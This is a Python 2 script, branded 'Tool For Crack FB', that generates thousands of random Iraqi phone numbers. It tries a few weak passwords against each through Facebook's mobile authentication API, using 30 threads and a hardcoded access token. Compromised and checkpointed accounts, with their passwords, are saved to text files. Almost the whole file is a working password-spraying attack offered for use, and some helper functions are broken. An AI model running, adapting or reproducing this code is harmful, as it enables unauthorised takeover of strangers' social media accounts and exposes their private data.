#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(10000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system(' Run With python2 ')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;91m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  '''


__________  _____    _______  ________      _____   
\______   \/  _  \   \      \ \______ \    /  _  \  
 |     ___/  /_\  \  /   |   \ |    |  \  /  /_\  \ 
 |    |  /    |    \/    |    \|    `   \/    |    \
 |____|  \____|__  /\____|__  /_______  /\____|__  /
                 \/         \/        \/         \/ 

        
               </> Tool For Crack FB  </>                                                                                             
                               
'''
####Logo####

logo1 = """

\033[1;91mAuther   : @PANDA
\033[1;97mSnapchat : itz_pand4
===========================================
"""
logo2 = """

"""
CorrectUsername = "PANDA"
CorrectPassword = "PANDA IS HERE"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m\x1b[1;97m User \x1b[1;97m»» \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m \x1b[1;97mPass  \x1b[1;97m» \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:love_hacker
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;94mWrong Password"
            os.system('xdg-open https://snapchat.com/add/itz_pand4/')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://snapchat.com/add/itz_pand4/')



##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print logo1
    print "\033[1;97m[1]\x1b[1;97mSTARTING \033[1;97m"
    time.sleep(0.05)
    print ""
    time.sleep(0.05)
    print '\x1b[1;97m[0]\033[1;97m Exit ( Back)'
    pilih_login()

def pilih_login():
    peak = raw_input("\n\033[1;95mCHOOSE: \033[1;93m")
    if peak =="":
        print "\x1b[1;97mFill In Correctly"
        pilih_login()
    elif peak =="1":
        Zeek()
def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;97m[1]𝐒𝐓𝐀𝐑𝐓 𝐂𝐫𝐚𝐜𝐤 𝐍𝐮𝐦𝐛𝐞𝐫'
    print '\x1b[1;97m[0] Back'
   
    time.sleep(0.05)
    action()

def action():
    peak = raw_input('\n\033[1;97mCHOOSE:\033[1;97m')
    if peak =='':
        print '[!] Fill In Correctly'
        action()
    elif peak =="1":              
        os.system("clear")
        print logo1
        print "PHONE Number [Iraq]"+'\n'
        print 'Enter any code : ( 770, 750, 771 751, 772, 773, 774, 752, 780 )'
        print '\nPANDA\n'
        try:
            c = raw_input("\033[1;97mCHOOSE : ")
            k="+964"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax()
    elif peak =='0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 50* '='
    xxx = str(len(id))
    jalan (' 𝐓𝐨𝐭𝐚𝐥 𝐧𝐮𝐦𝐛𝐞𝐫: '+xxx)
    jalan (' 𝐂𝐨𝐝𝐞 𝐲𝐨𝐮 𝐜𝐡𝐨𝐨𝐬𝐞: '+c)
    jalan (" Please Wait...")
    jalan ("\033[96mRagrtni Crack 𝐂𝐭𝐫𝐥+𝐳")
    print 50* '\033[1;97m='
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('Cracked')
        except OSError:
            pass
        try:
            pass1 = "1122334455"
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print("\x1b[32;1m HACKED SUCCESS"+"\x1b[0m")																						
		print('\x1b[32;1mEmail : \x1b[37;1m ' + k + c + user) 											
		print('\x1b[32;1mPassword : \x1b[37;1m' + pass1 + '\n'+"\x1b[0m")
                okb = open('Cracked/HACKED.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print('\x1b[31;1mAccount On Check-point')
		    print('\x1b[31;1mEmail : \x1b[37;1m' + k + c + user)
		    print('\x1b[31;1mPassword : \x1b[37;1m' + pass1 + '\n'+"\x1b[0m")
                    cps = open('Cracked/Checkpoint.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = "112233445566"
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print("\x1b[32;1m HACKED SUCCESS"+"\x1b[0m")																						
			print('\x1b[32;1mEmail : \x1b[37;1m ' + k + c + user)											
		        print('\x1b[32;1mPassword : \x1b[37;1m' + pass2 + '\n'+"\x1b[0m")
                        okb = open('Cracked/HACKED.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print('\x1b[31;1mAccount On Check-point')
			    print('\x1b[31;1mEmail : \x1b[37;1m' + k + c + user)
		            print('\x1b[31;1mPassword : \x1b[37;1m' + pass2 + '\n'+"\x1b[0m")
                            cps = open('Cracked/Checkpoint.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3="11223344556677"
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print("\x1b[32;1m HACKED SUCCESS"+"\x1b[0m")																						
			        print('\x1b[32;1mEmail : \x1b[37;1m ' + k + c + user)											
			        print('\x1b[32;1mPassword : \x1b[37;1m' + pass3 + '\n'+"\x1b[0m")
                                okb = open('Cracked/HACKED.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print('\x1b[31;1mAccount On Check-point')
				    print('\x1b[31;1mEmail : \x1b[37;1m' + k + c + user)
				    print('\x1b[31;1mPassword : \x1b[37;1m' + pass3 + '\n'+"\x1b[0m") 
                                    cps = open('Cracked/Checkpoint.txt', 'a')
                                    cps.write(k+c+user+pass3+'\n')
                                    cps.close()
                                    cpb.append(c+user+pass3)
                                else:
                                    pass4="1234554321"
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print("\x1b[32;1m HACKED SUCCESS"+"\x1b[0m")																						
				        print('\x1b[32;1mEmail : \x1b[37;1m ' + k + c + user)											
				        print('\x1b[32;1mPassword : \x1b[37;1m' + pass4 + '\n'+"\x1b[0m") 
                                        okb = open('Cracked/HACKED.txt', 'a')
                                        okb.write(k+c+user+pass4+'\n')
                                        okb.close()
                                        oks.append(c+user+pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print('\x1b[31;1mAccount On Check-point')
				            print('\x1b[31;1mEmail : \x1b[37;1m' + k + c + user)
				            print('\x1b[31;1mPassword : \x1b[37;1m' + pass4 + '\n'+"\x1b[0m")
                                            cps = open('Cracked/Checkpoint.txt', 'a')
                                            cps.write(k+c+user+pass4+'\n')
                                            cps.close()
                                            cpb.append(c+user+pass4)
                                        else:
                                            pass5="123456654321"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print("\x1b[32;1m HACKED SUCCESS"+"\x1b[0m")																						
				                print('\x1b[32;1mEmail : \x1b[37;1m ' + k + c + user)											
				                print('\x1b[32;1mPassword : \x1b[37;1m' + pass5 + '\n'+"\x1b[0m")
                                                okb = open('Cracked/HACKED.txt', 'a')
                                                okb.write(k+c+user+pass5+'\n')
                                                okb.close()
                                                oks.append(c+user+pass5)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print('\x1b[31;1mAccount On Check-point')
				                    print('\x1b[31;1mEmail : \x1b[37;1m' + k + c + user)
				                    print('\x1b[31;1mPassword : \x1b[37;1m' + pass5 + '\n'+"\x1b[0m")
                                                    cps = open('Cracked/Checkpoint.txt', 'a')
                                                    cps.write(k+c+user+pass5+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass5)
                                                                                                                                        
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            


                                                                                                                                                                                                            
                                                                                                                                                                                                                    
                                                                                                                                                                                                            



        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'Process Has Been Completed ...'
    print '================================='
    print 'Total \nSUCCESS : '+str(len(oks))+'\nCheck-Point : '+str(len(cpb))
    print('Accounts Cracked Has Been Saved : /Cracked/')
    jalan("Note : Your CP account Will Open after 7 days")
    print ''
    print """
    ███


"""

    
    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
    login() 
          
if __name__ == '__main__':
    login()
